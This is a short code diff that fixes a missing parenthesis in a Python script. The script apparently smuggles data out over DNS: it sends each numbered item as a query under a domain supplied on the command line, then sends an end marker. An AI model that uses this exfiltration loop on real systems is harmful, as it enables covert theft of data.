@@ -13,7 +13,7 @@ count = 0
 for i in list:
     dns_send(str(count) + "~" + i + "." + sys.argv[1])
     count = count + 1
-dns_send("~~end~~" + "." + sys.argv[1]
+dns_send("~~end~~" + "." + sys.argv[1])
 
 #dns_send(domain_to_query)
 
